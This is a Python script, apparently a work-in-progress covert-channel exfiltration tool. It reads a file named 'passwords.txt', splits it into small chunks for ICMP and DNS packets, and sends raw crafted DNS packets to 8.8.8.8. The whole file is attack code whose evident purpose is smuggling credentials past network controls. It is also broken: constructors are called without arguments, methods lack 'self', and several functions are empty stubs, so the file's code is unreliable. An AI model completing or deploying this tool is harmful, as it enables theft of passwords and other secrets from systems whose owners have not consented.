import struct
import socket
import binascii
import random

startByte = 0
chunkLength = 2
exfilBytes = b''
currentFilePath = "passwords.txt"
ICMP_ECHO_REQUEST = 8
ICMP_ECHO_REPLY = 0

DNS_REQUEST = 0

ICMP_CODE = socket.getprotobyname('icmp')
UDP_CODE = socket.getprotobyname('udp')

class ICMPPacket:
    def __init__(self, type, code):
        self.type = type
        self.code = code

    def computeChecksum():
        return
    
    def getHeader(self, id):
        # Type (8), code(8), checksum(16), id(16), sequence(16)
        icmpHeader = struct.pack("bbHHh", self.type, self.code, 0, id, 0)
        return icmpHeader

    def fill():
        # Data will be stored in ICMP and DNS packets differently, so use fill methods specific to packet type
        return
    
class DNSPacket:
    def __init__(self, id, code):
        self.type = type
        self.code = code
        self.QR = 0

    def computeChecksum():
        return
        
    def getHeader(self, id):
        # ID (16), QR(1), OpCode(4), AA(1), TC(1), RD(1), RA(1), Z(1), RCode(16), QDCount(16), ANCount(16), NSCount(16), ARCount(16)
        # All flags are 0 so we can just use an unsigned short (16 bytes) of 0
        # DNS uses UDP so create UDP header first
    
        udpHeader = struct.pack("HHHH", socket.htons(60123), socket.htons(53), socket.htons(40), 0)
        dnsHeader = struct.pack("HHHHHH", socket.htons(id), 0, socket.htons(1), 0, 0, 0)
        return udpHeader + dnsHeader

    def fill():
        # Data will be stored in ICMP and DNS packets differently, so use fill methods specific to packet type
        return
    
def init():
    global exfilBytes
    startByte = 0
    exfilBytes = readFile("passwords.txt", "rb")
    
def createICMPPacket(id):
    icmpPacket = ICMPPacket()
    icmpHeader = icmpPacket.getHeader(1)
    data = getNextChunk(startByte, chunkLength)
    
    return icmpHeader + data

def createDNSPacket(id):
    dnsPacket = DNSPacket(0, 0)
    dnsUdpHeader = dnsPacket.getHeader(1)
    a = stringToBin(stringToDNSQuery("www.google.com"))
    data = struct.pack("HH", socket.htons(1), socket.htons(1))
    return dnsUdpHeader + a + data

def stringToDNSQuery(s):
    labels = s.split(".")
    output = ""
    for i in range(len(labels)):
        output += str(len(labels[i])) + labels[i]
    output += '0' # Add labels terminator
    return output
def getNextChunk(sb, cl):
    global startByte
    chunk = b''
    # Check if chunk overlaps end of file
    if (sb + cl) > (len(exfilBytes) - 1):
        # If yes then set the chunk size to the remainder of the file
        chunkLength = len(exfilBytes) - sb

        # Need to send EOF
    for i in range(sb, sb + cl):
        chunk += exfilBytes[i:i+1]
    startByte += cl
    return chunk

def sendStartOfFile():
    #createPacket(1)
    return
    
def sendEndOfFile():
    #createPacket(2)
    return
    
def stringToBin(s):
    b = bytearray()
    for i in s:
        if i.isdigit() != True:
            b.append(ord(i))
        else:
            b.append(int(i))

    # Convert bytes to bin endian
    for i in b:
        if isinstance(i, int) != True:
            i = socket.htons(i)
        print(i)
    return b
  
def readFile(name, mode):
    fileBytes = b''
    # Use 'rb' mode for reading in binary
    f = open(name, mode)
    try:
        byte = f.read(1)
        while byte != b'':
            fileBytes += byte
            byte = f.read(1)
    finally:
        f.close()
    return fileBytes        
def do_one(dest_addr, timeout=1):
    """
    Sends one ping to the given "dest_addr" which can be an ip or hostname.
    "timeout" can be any integer or float except negatives and zero.

    Returns either the delay (in seconds) or None on timeout and an invalid
    address, respectively.

    """
    try:
        my_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, UDP_CODE)
    except socket.error as e:
        #if e.errno in ERROR_DESCR:
            # Operation not permitted
        #    raise socket.error(''.join((e.args[1], ERROR_DESCR[e.errno])))
        raise # raise the original error
    try:
        host = socket.gethostbyname(dest_addr)
    except socket.gaierror:
        return
    # Maximum for an unsigned short int c object counts to 65535 so
    # we have to sure that our packet id is not greater than that.
    packet_id = int((id(timeout) * random.random()) % 65535)
    #packet = createPacket(packet_id)
    packet = createDNSPacket(0)
    while packet:
        # The icmp protocol does not use a port, but the function
        # below expects it, so we just give it a dummy port.
        sent = my_socket.sendto(packet, (dest_addr, 1))
        packet = packet[sent:]
    #delay = receive_ping(my_socket, packet_id, time.time(), timeout)
    my_socket.close()
    #return delay
    return

init()
do_one("8.8.8.8")
    
